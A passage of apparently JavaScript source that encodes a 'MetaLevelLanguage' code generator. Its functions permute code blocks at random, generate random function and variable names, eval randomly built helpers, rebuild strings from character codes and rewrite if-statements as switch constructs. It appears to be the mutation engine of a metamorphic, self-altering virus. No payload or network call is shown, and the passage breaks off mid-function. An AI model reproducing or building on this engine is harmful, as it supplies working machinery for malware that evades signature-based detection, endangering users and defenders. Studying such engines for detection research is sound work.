            MetaLevelLanguage+='__(PCAA500|PCAA300,PCAA400)while(var PCEvalFctC=#x1#n0n#1x#$#x2°+PCEvalFctC+°2x#!#x3#n100n#3x#?<@°+PCEvalFctC+°=#x4°+PCEvalFctC+°4x# +#x5#n1n#5x#)011';            
                MetaLevelLanguage+='__(PCAAA100|)var PCFFilledArguments=#x1[]1x#';            
                MetaLevelLanguage+='__(PCAAA200|PCAAA100)while(var PCFFc=#x1#n0n#1x#$#x2°+PCFFc+°2x#!#x3#O1°+PCFunctionArguments+°#.length1O#3x#?<@°+PCFFc+°=#x4#x5°+PCFFc+°5x# +#n1n#4x#)001';
                    MetaLevelLanguage+='__(PCAAAA100|)y#O1°+PCFFilledArguments+°#.push(#x1fGiveRandomNumber(#x2#n256n#2x#)1x#)1O#';                                                 
                MetaLevelLanguage+='__(PCAAA300|PCAAA200)var PCFCall=#x1#x2°+PCFname+° 2x#+#x3#""(""#3x#+ #x4#O1°+PCFFilledArguments+°#.join()1O#4x#+#x5#"")""#5x#1x#';   
                MetaLevelLanguage+='__(PCAAA400|PCAAA300)var PCFResult=#x1eval(#x2°+PCFCall+°2x#)1x#';      
                MetaLevelLanguage+='__(PCAAA500|PCAAA400)if(#x1°+PCFResult+°1x#!#x2#n0n#2x#?>=)004';             
                    MetaLevelLanguage+='__(PCAAAA100|)if(°+PCFResult+°!256?<)002';
                        MetaLevelLanguage+='__(PCAAAAA100|)y°+PCIsItAUsefulFunction+°=#x1#n1n#1x#';
                        MetaLevelLanguage+='__(PCAAAAA200|)y#O1°+FullArray+°[#x1°+PCFResult+°1x#]#.push(#x2°+PCFCall+°2x#)1O#';                                          
                    MetaLevelLanguage+='__(PCAAAA200|)000';
                MetaLevelLanguage+='__(PCAAA600|)000';                        
            MetaLevelLanguage+='__(PCAA600|PCAA500)if(#x1°+PCIsItAUsefulFunction+°1x#!#x2#n1n#2x#?==)003';
                MetaLevelLanguage+='__(PCAAA100|)y#O1°+sFunctionDefs+°.push(#x1#x2#""return ""#2x#+#x3 °+PCFgramm+°3x#1x#)1O#';            
                MetaLevelLanguage+='__(PCAAA200|)y#O1°+sFunctionArgs+°.push(#x1#""(""#+#x2 #O2°+PCFunctionArguments+°#.join()2O#2x#+#x3"")""3x#1x#)1O#';              
                MetaLevelLanguage+='__(PCAAA300|)y#O1°+sFunctionNames+°.push(#x1°+PCFname+°1x#)1O#';             
            MetaLevelLanguage+='__(PCAA700|)000';
        MetaLevelLanguage+='__(PCB900|)000';      
                               
                               
                               
MetaLevelLanguage+='__(1700|)function fPermutator(argPermutatorMLL)042'; 
    MetaLevelLanguage+='__(PM0100|)var PMInfoCodeArray=#x1[]1x#';
    MetaLevelLanguage+='__(PM0200|)var PMPermIdentifier=#x1[]1x#';
    MetaLevelLanguage+='__(PM0300|)var PMRequiredCodes=#x1[]1x#';
    MetaLevelLanguage+='__(PM0400|)var PMMLLcount=#x1#n0n#1x#';
    MetaLevelLanguage+='__(PM0500|PM0100,PM0200,PM0300,PM0400)while(var MLLPermC1=#x1#n0n#1x#$#x2°+PMMLLcount+°2x#!#x3#O1°+argPermutatorMLL+°#.length1O#3x#?<@°+MLLPermC1+°=#x4#x5°+MLLPermC1+°5x# +#x6#n1n#6x#4x#)026'; 
        MetaLevelLanguage+='__(PMA0100|)y°+PMPermIdentifier+°[#x7°+MLLPermC1+°7x#]=#x1#O1°+argPermutatorMLL+°[#x2°+PMMLLcount+°2x#]#.substring(#x3#O2°+argPermutatorMLL+°[°+PMMLLcount+°]#.indexOf(""("")2O#+#x4#n1n#4x#3x#,#x5#O3°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.indexOf(""|"")3O#5x#)1O#1x#';  
        MetaLevelLanguage+='__(PMA0200|)y°+PMRequiredCodes+°[#x6°+MLLPermC1+°6x#]=#x1#O1°+argPermutatorMLL+°[#x2°+PMMLLcount+°2x#]#.substring(#x3#O2°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.indexOf(#x5#""|""#5x#)2O#+#n1n#3x#,#x8#O3°+argPermutatorMLL+°[#x9°+PMMLLcount+°9x#]#.indexOf(#x7#"")""#7x#)3O#8x#)1O#1x#'; 
        MetaLevelLanguage+='__(PMA0300|)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2[]2x#';
        MetaLevelLanguage+='__(PMA0400|PMA0300)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#][#x2#n0n#2x#]=#x3#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x8°+PMMLLcount+°8x#]#.indexOf(#x7#"")""#7x#)2O#+#x6#n1n#6x#5x#)1O#3x#';
        MetaLevelLanguage+='__(PMA0500|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n2n#5x#)1O#1x#!#x6#""if""#6x#?==)009'; 
            MetaLevelLanguage+='__(PMAA100|)var PMNumberOfLinesIf=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x9#x5#O2°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.lastIndexOf(#x7#"")""#7x#)2O#5x#+#x8#n1n#8x#9x#)1O#2x#,#x3#n10n#3x#)1x#';
            MetaLevelLanguage+='__(PMAA200|PMAA100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6#x7°+PMMLLcount+°7x# +#n1n#6x#,#x8#x9°+PMMLLcount+° + °+PMNumberOfLinesIf+°9x# +#n1n#8x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMAA300|PMAA200)y°+PMMLLcount+°=#x1#x2#x3°+PMMLLcount+°3x# + #x5°+PMNumberOfLinesIf+°5x#2x# +#x4#n1n#4x#1x#';     // pointer to else-line (which contains the number of elements contained in else)
            MetaLevelLanguage+='__(PMAA400|PMAA300)var PMNumberOfLinesElse=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x8#"")""#8x#)2O#+#x6#n1n#6x#5x#)1O#2x#,#x3#n10n#3x#)1x#';           
            MetaLevelLanguage+='__(PMAA500|PMAA300)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4#O2°+argPermutatorMLL+°[#x5°+PMMLLcount+°5x#]#.substring(#x8#O3°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.lastIndexOf(#x7#"")""#7x#)3O#+#n1n#8x#)2O#4x#)1O#2x#';// add the else-number part
            MetaLevelLanguage+='__(PMAA600|PMAA400,PMAA500)if(#x1°+PMNumberOfLinesElse+°1x#!#x2#n0n#2x#?>)001';                // if there are lines in the else-part, add them
                MetaLevelLanguage+='__(PMB100|)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4#O2fPermutator(#x5#O3°+argPermutatorMLL+°#.slice(#x6#x7°+PMMLLcount+° 7x#+#n1n#6x#,#x8°+PMMLLcount+° +#x9 °+PMNumberOfLinesElse+° 9x#+#n1n#8x#)3O#5x#)2O#4x#)1O#2x#'; 
            MetaLevelLanguage+='__(PMAA700|)000';
            MetaLevelLanguage+='__(PMAA800|PMAA600)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesElse+°3x#1x#';
        MetaLevelLanguage+='__(PMA0600|)000';            
        MetaLevelLanguage+='__(PMA0700|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n5n#5x#)1O#1x#!#x6#""while""#6x#?==)003';
            MetaLevelLanguage+='__(PMB100|)var PMNumberOfLinesWhile=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#x6#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x8#"")""#8x#)2O#6x#+#n1n#5x#)1O#2x#,#x3#n10n#3x#)1x#';  // OK
            MetaLevelLanguage+='__(PMB200|PMB100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6°+PMMLLcount+° +#n1n#6x#,#x7#x8°+PMMLLcount+°8x# +#x9 °+PMNumberOfLinesWhile+° 9x#+#n1n#7x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMB300|PMB200)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesWhile+°3x#1x#';
        MetaLevelLanguage+='__(PMA0800|)000';
        MetaLevelLanguage+='__(PMA0900|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n9n#5x#)1O#1x#!#x6#""function ""#6x#?==)003';  
            MetaLevelLanguage+='__(PMB100|)var PMNumberOfLinesFunction=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x6#"")""#6x#)2O#+#n1n#5x#)1O#2x#,#x3#n10n#3x#)1x#';
            MetaLevelLanguage+='__(PMB200|PMB100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6°+PMMLLcount+° +#n1n#6x#,#x7#x8°+PMMLLcount+° 8x#+#x9 °+PMNumberOfLinesFunction+° 9x#+#n1n#7x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMB300|PMB200)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesFunction+°3x#1x#';
        MetaLevelLanguage+='__(PMA1000|)000';
        MetaLevelLanguage+='__(PMA1100|PMA0100,PMA0200,PMA0500,PMA0700,PMA0900)c+1(°+PMMLLcount+°)';
    MetaLevelLanguage+='__(PM0600|PM0500)y#O1°+PMRequiredCodes+°#.push()1O#';                   
    MetaLevelLanguage+='__(PM0700|)var PermutatedCodeArray=#x1[]1x#';
    MetaLevelLanguage+='__(PM0800|PM0600,PM0700)while($#x1#O1°+PMInfoCodeArray+°#.length1O#1x#!#x2#n0n#2x#?>@)007';  
        MetaLevelLanguage+='__(PMA100|)var PMRandomElement=#x1fGiveRandomNumber(#x2#O1°+PMInfoCodeArray+°#.length1O#2x#)1x#';           
        MetaLevelLanguage+='__(PMA200|PMA100)if(#x1#O1#O2°+PMRequiredCodes+°#.toString()2O##.indexOf(#x2°+PMPermIdentifier+°[#x3°+PMRandomElement+°3x#]2x#)1O#1x#!#x4#n-1n#4x#?==)004';   // OK
            MetaLevelLanguage+='__(PMB100|)y°+PermutatedCodeArray+°=#x1#O1°+PMInfoCodeArray+°[#x2°+PMRandomElement+°2x#]#.concat(#x3°+PermutatedCodeArray+°3x#)1O#1x#';
            MetaLevelLanguage+='__(PMB200|PMB100)y#O1°+PMInfoCodeArray+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
            MetaLevelLanguage+='__(PMB300|)y#O1°+PMPermIdentifier+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
            MetaLevelLanguage+='__(PMB400|)y#O1°+PMRequiredCodes+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
        MetaLevelLanguage+='__(PMA300|)000';
    MetaLevelLanguage+='__(PM0900|PM0800)xreturn(#x1#O1°+PermutatedCodeArray+°#.slice()1O#1x#)';




MetaLevelLanguage+='__(1800|)function fCreateObjectExecution(argCOE1)026'; 
    MetaLevelLanguage+='__(CEO0100|)while($#x1#O1°+argCOE1+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n79n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)003';
        MetaLevelLanguage+='__(CEOA100|)var COEObjectNumber=#x1#O1°+argCOE1+°#.charAt(#x2#O2°+argCOE1+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n79n#8x#)6x#4x#)2O#+#x3#n2n#3x#2x#)1O#1x#'; 
        MetaLevelLanguage+='__(CEOA200|CEOA100)var COEFullObject=#x1#O1°+argCOE1+°#.substring(#x2#O2°+argCOE1+°#.indexOf(#x6fGiveMeString(#n35n#)+fGiveMeString(#n79n#)6x#)2O#+#n3n#2x#,#x3#O3°+argCOE1+°#.indexOf(#x4#x7°+COEObjectNumber+°7x# +#x5#x8fGiveMeString(79)8x#+fGiveMeString(35)5x#4x#)3O#3x#)1O#1x#'; // OK
        MetaLevelLanguage+='__(CEOA300|CEOA200)y°+argCOE1+°=#x1#x2#O1°+argCOE1+°#.substring(#n0n#,#x3#O2°+argCOE1+°#.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n79n#)4x#)2O#3x#)1O#2x#+#x5fCreateObjectExecution(#x6°+COEFullObject+°6x#)5x#+ #x7#O3°+argCOE1+°#.substring(#x8#O4°+argCOE1+°#.indexOf(#x9°+COEObjectNumber+° +fGiveMeString(#n79n#)+fGiveMeString(#n35n#)9x#)4O#+#n3n#8x#)3O#7x#1x#';
    MetaLevelLanguage+='__(CEO0200|CEO0100)while($#x1#O1°+argCOE1+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n46n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)020';
        MetaLevelLanguage+='__(CEOA100|)if(#x1fGiveRandomNumber(#x2#n3n#2x#)1x#!#x3#n0n#3x#?==)017'; 
            MetaLevelLanguage+='__(CEOB100|)var COEObjectName=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(CEOB200|)var COEVariableList=#x1[]1x#';
            MetaLevelLanguage+='__(CEOB300|)var COEVariableRndList=#x1[]1x#';
            MetaLevelLanguage+='__(CEOB400|)var COEObjString=#x1#O1°+argCOE1+°#.substring(#x2#n0n#2x#,#x3#O2°+argCOE1+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n46n#8x#)6x#4x#)2O#3x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB500|CEOB400)while($#x1#O1°+COEObjString+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n120n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)003';
                MetaLevelLanguage+='__(CEOC100|)var COEexecNum=#x1#O1°+COEObjString+°#.charAt(#x2#O2°+COEObjString+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n120n#8x#)6x#4x#)2O#+#x3#n2n#3x#2x#)1O#1x#';
                MetaLevelLanguage+='__(CEOC200|CEOC100)y°+COEObjString+°=#x1#O1°+COEObjString+°#.replace(#x2#x3#x4fGiveMeString(#x6#n35n#6x#)4x#+fGiveMeString(#x7#n120n#7x#)3x#+#x8 °+COEexecNum+°8x#2x#,#x5#""""#5x#)1O#1x#';
                MetaLevelLanguage+='__(CEOC300|CEOC200)y°+COEObjString+°=#x1#O1°+COEObjString+°#.replace(#x4#x2#x3°+COEexecNum+° 3x#+fGiveMeString(#x6#n120n#6x#)2x#+fGiveMeString(#x7#n35n#7x#)4x#,#x5#""""#5x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB600|CEOB200,CEOB300,CEOB500)y°+COEObjString+°=#x1fCreateVariableListForFunctionCalls(#x2°+COEObjString+°2x#,#x3°+COEVariableList+°3x#,#x4°+COEVariableRndList+°4x#)1x#';
            MetaLevelLanguage+='__(CEOB700|CEOB600)y#O1sFunctionDefs#.push(#x2#x3#x4#""return ""#4x#+ #x6°+COEObjString+°6x#3x#2x#)1O#';  
            MetaLevelLanguage+='__(CEOB800|CEOB100)y#O1sFunctionNames#.push(#x1°+COEObjectName+°1x#)1O#'; 
            MetaLevelLanguage+='__(CEOB900|CEOB600)y#O1sFunctionArgs#.push(#x1#x2#""(""#2x#+#x3 #O2°+COEVariableRndList+°#.join()2O#3x#+#x4"")""4x#1x#)1O#';    
            MetaLevelLanguage+='__(CEOB910|CEOB600)var COEReturnValue=#x1#O1°+COEVariableList+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#x9#n176n#9x#)4x#+#x5#"",""#5x#+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#n43n#)7x#2x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB920|CEOB910)if(#x1#O1°+COEVariableList+°#.length1O#1x#!#x2#n0n#2x#?>)001';
                MetaLevelLanguage+='__(CEOC100|)y°+COEReturnValue+°=#x1#x2fGiveMeString(#n176n#)2x#+#x3fGiveMeString(#n43n#)3x#+#x4 °+COEReturnValue+° 4x#+#x5fGiveMeString(#n43n#)5x#+#x6fGiveMeString(#n176n#)6x#1x#';
            MetaLevelLanguage+='__(CEOB930|)000';
            MetaLevelLanguage+='__(CEOB940|CEOB100,CEOB700,CEOB800,CEOB900,CEOB920)y°+argCOE1+°=#x1fCreateObjectExecution(#x2#x3°+COEObjectName+° 3x#+#x4""(""4x#+#x5 °+COEReturnValue+° 5x#+#x6"")""6x#+#x7 #O1°+argCOE1+°#.substring(#x8#O2°+argCOE1+°#.indexOf(#x9fGiveMeString(#n35n#)+fGiveMeString(#n46n#)9x#)2O#+#n1n#8x#)1O#7x#2x#)1x#';
        MetaLevelLanguage+='__(CEOA200|)001'; 
            MetaLevelLanguage+='__(CEOB100|)y°+argCOE1+°=#x1fCreateObjectExecution(#x2#O1°+argCOE1+°#.replace(#x3#x4fGiveMeString(#x8#n35n#8x#)4x#+#x5fGiveMeString(46)5x#3x#,#x6fGiveMeString(#x7#n46n#7x#)6x#)1O#2x#)1x#';           
    MetaLevelLanguage+='__(CEO0300|CEO0200)xreturn(#x1°+argCOE1+°1x#)';   



MetaLevelLanguage+='__(1900|)function fExecutionParser(argEP1)005';
    MetaLevelLanguage+='__(EP100|)while($#x1#O1°+argEP1+°#.indexOf(#x2#x3fGiveMeString(35)3x#+#x4fGiveMeString(120)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)003';
        MetaLevelLanguage+='__(EPA100|)var EPExecutionNumber=#x1#O1°+argEP1+°#.charAt(#x2#O2°+argEP1+°#.indexOf(#x3#x4fGiveMeString(#x6#n35n#6x#)4x#+#x5fGiveMeString(#x7#n120n#7x#)5x#3x#)2O#+#x8#n2n#8x#2x#)1O#1x#'; 
        MetaLevelLanguage+='__(EPA200|EPA100)var EPnewExecutionToReplace=#x1#O1°+argEP1+°#.substring(#x2#O2°+argEP1+°#.indexOf(fGiveMeString(#x5#n35n#5x#)+fGiveMeString(120))2O#+#n3n#2x#,#x3#O3°+argEP1+°#.indexOf(#x4°+EPExecutionNumber+° +fGiveMeString(#x6#n120n#6x#)+fGiveMeString(#x7#n35n#7x#)4x#)3O#3x#)1O#1x#';   // OK
        MetaLevelLanguage+='__(EPA300|EPA200)y°+argEP1+°=#x1#O1°+argEP1+°#.substring(#x2#n0n#2x#,#x3#O2°+argEP1+°#.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n120n#)4x#)2O#3x#)+#x5fDeriveRestrictVC(#x6fExecutionParser(#x7°+EPnewExecutionToReplace+°7x#)6x#,#n75n#,#n1n#)5x#+ #x8#O4°+argEP1+°#.substring(#x9#O5°+argEP1+°#.indexOf(°+EPExecutionNumber+° +fGiveMeString(#n120n#)+fGiveMeString(#n35n#))5O#9x#+3)4O#8x#1O#1x#';
    MetaLevelLanguage+='__(EP200|EP100)xreturn(#x1°+argEP1+°1x#)';



MetaLevelLanguage+='__(2000|)function fCreateBlockOfCode(argCodeBlockArray)254';
    MetaLevelLanguage+='__(CBC0100|)var CBCRString=#x1#""""#1x#';
    MetaLevelLanguage+='__(CBC0200|)var CBCCodeLineIndex=#x1#n0n#1x#';
    MetaLevelLanguage+='__(CBC0300|)var CBCLocalVarName=#x1[]1x#';
    MetaLevelLanguage+='__(CBC0400|)var CBCLocalVarDefs=#x1[]1x#';
    MetaLevelLanguage+='__(CBC0500|)c+1(°+sHierarchyOfCalls+°)';
    MetaLevelLanguage+='__(CBC0600|CBC0100,CBC0200,CBC0300,CBC0400,CBC0500)while($#x1°+CBCCodeLineIndex+°1x#!#x2#O1°+argCodeBlockArray+°#.length1O#2x#?<@)230';
        MetaLevelLanguage+='__(CBCA100|)var CBCSingleElement=#x1#x2°+argCodeBlockArray+°2x#[#x3°+CBCCodeLineIndex+°3x#]1x#';
        MetaLevelLanguage+='__(CBCA200|CBCA100)while($#x1#O1°+CBCSingleElement+°#.indexOf(#x2#x3fGiveMeString(#x4#n35n#4x#)3x#+#x5fGiveMeString(#x6#n34n#6x#)5x#2x#)1O#1x#!-1?!=@)002';
            MetaLevelLanguage+='__(CBCB100|)var CBCnewStringToReplace=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n35n#)+fGiveMeString(#n34n#)3x#)2x#+#n2n#,#x4°+CBCSingleElement+°.indexOf(#x5fGiveMeString(#n34n#)+fGiveMeString(#n35n#)5x#)4x#)1O#1x#';        
            MetaLevelLanguage+='__(CBCB200|CBCB100)y°+CBCSingleElement+°=#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n35n#)+fGiveMeString(#n34n#)3x#)2x#)1O#1x#+#x4fCreateString(#x5°+CBCnewStringToReplace+°5x#)4x#+ #x6°+CBCSingleElement+°.substring(#x7°+CBCSingleElement+°.indexOf(#x8fGiveMeString(#n34n#)+fGiveMeString(#n35n#)8x#)7x#+#x9#n2n#9x#)6x#'; 
        MetaLevelLanguage+='__(CBCA300|CBCA100)while($#x1#O1°+CBCSingleElement+°#.indexOf(#x2#x3fGiveMeString(#n35n#)3x#+#x4fGiveMeString(#n110n#)4x#2x#)1O#1x#!#n-1n#?!=@)003';
            MetaLevelLanguage+='__(CBCB050|)var CBCnewNumberStart=#x1°+CBCSingleElement+°.indexOf(#x2fGiveMeString(#n35n#)+fGiveMeString(#n110n#)2x#)+#n2n#1x#';  
            MetaLevelLanguage+='__(CBCB100|CBCB050)var CBCnewNumberToReplace=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCnewNumberStart+°2x#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n110n#)+fGiveMeString(#n35n#)4x#,#x5°+CBCnewNumberStart+°5x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBCB200|CBCB100)y°+CBCSingleElement+°=#x1#x2#O1°+CBCSingleElement+°#.substring(#n0n#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n110n#)4x#)3x#)1O#2x#+#x5fCreateNumeric(#x6°+CBCnewNumberToReplace+°6x#)5x#+ #x7°+CBCSingleElement+°.substring(#x8°+CBCSingleElement+°.indexOf(#x9fGiveMeString(110)+fGiveMeString(35)9x#,°+CBCnewNumberStart+°)+#n2n#8x#)7x#1x#';
        MetaLevelLanguage+='__(CBCA400|CBCA200,CBCA300)y°+CBCSingleElement+°=#x1fCreateObjectExecution(#x2°+CBCSingleElement+°2x#)1x#';
        MetaLevelLanguage+='__(CBCA500|CBCA400)y°+CBCSingleElement+°=#x1fExecutionParser(#x2°+CBCSingleElement+°2x#)1x#';       
        MetaLevelLanguage+='__(CBCB050|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n2n#)1O#1x#!#x2#""if""#2x#?==)075';
            MetaLevelLanguage+='__(CBC0100|)var CBCcondition=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#"")""#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0200|)var CBCNumOfElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3#x4°+CBCSingleElement+°.lastIndexOf(#"")""#)4x#+#n1n#3x#)1O#2x#,#n10n#)1x#';
            MetaLevelLanguage+='__(CBC0300|CBC0200)var NumOfElementsAntiCode=#x1parseInt(#x2#x3°+argCodeBlockArray+°3x#[#x7#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfElementsCode+°5x# +#x6#n1n#6x#7x#]2x#,#n10n#)1x#';          
            MetaLevelLanguage+='__(CBC0400|CBC0200)var CBCExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2#x6°+CBCCodeLineIndex+°6x# +#n1n#2x#,#x3#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfElementsCode+°5x# +#n1n#3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0500|CBC0300)var CBCifAntiCode=#x1#O1°+argCodeBlockArray+°#.slice(#x4#x2°+CBCCodeLineIndex+°2x# + #x3°+CBCNumOfElementsCode+°3x# +#n2n#4x#,#x5#x6°+CBCCodeLineIndex+°6x# + #x7°+CBCNumOfElementsCode+°7x# + #x8°+NumOfElementsAntiCode+°8x# +#n2n#5x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0525|CBC0300)var CBCLogicOperator=#x1#O1°+CBCSingleElement+°#.substring(#x2#x3°+CBCSingleElement+°.indexOf(#""?""#)3x#+#n1n#2x#,#x4°+CBCSingleElement+°.lastIndexOf(#x5#"")""#5x#)4x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0550|CBC0525)var CBClogic1=#x1#x2(#x4°+CBCLogicOperator+°4x#==#""==""#)2x#&&#x3(#x5#x6fGiveRandomNumber(#n2n#)6x#==#n0n#5x#)3x#1x#'      
            MetaLevelLanguage+='__(CBC0600|CBC0100,CBC0400,CBC0500,CBC0550)if(#x1°+CBClogic1+°1x#!#x2#n0n#2x#?!=)042';            
                MetaLevelLanguage+='__(CBC100|)var CBCifargument1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#""!""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC200|)var CBCifargument2=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""!""#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#""?""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC300|)var CBCifdefcode=#x1#""""#1x#';                
                MetaLevelLanguage+='__(CBC400|CBC300)if(#x1#O1°+CBCifAntiCode+°#.length1O#1x#!#x2#n0n#2x#?>)014';
                    MetaLevelLanguage+='__(CBC100|)c+s(°+CBCifdefcode+°,#x2#""defaul""#2x#)';
                    MetaLevelLanguage+='__(CBC200|CBC100)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n116n#)2x#)';
                    MetaLevelLanguage+='__(CBC300|CBC200)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n58n#)2x#)';
                    MetaLevelLanguage+='__(CBC400|CBC300)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n33n#)2x#)';
                    MetaLevelLanguage+='__(CBC500|CBC400)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n64n#)2x#)';
                    MetaLevelLanguage+='__(CBC600|CBC500)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n123n#)2x#)';
                    MetaLevelLanguage+='__(CBC700|CBC600)c+s(°+CBCifdefcode+°,#x2fCreateBlockOfCode(#x3°+CBCifAntiCode+°3x#)2x#)';
                    MetaLevelLanguage+='__(CBC800|CBC700)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n33n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC900|CBC800)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n64n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC110|CBC900)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n125n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC120|CBC110)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n59n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC130|CBC120)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n98n#)2x#)';
                    MetaLevelLanguage+='__(CBC140|CBC130)c+s(°+CBCifdefcode+°,#x2""reak""2x#)';
                    MetaLevelLanguage+='__(CBC150|CBC140)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n59n#)2x#)';                                                                                                                                                                                                                                                                                                                                                    
                MetaLevelLanguage+='__(CBC500|)000';                
                MetaLevelLanguage+='__(CBC600|)c+s(°+CBCRString+°,#x1#""switch(""#1x#)'
                MetaLevelLanguage+='__(CBC700|CBC100,CBC600)c+s(°+CBCRString+°,#x1°+CBCifargument1+°1x#)';                                   
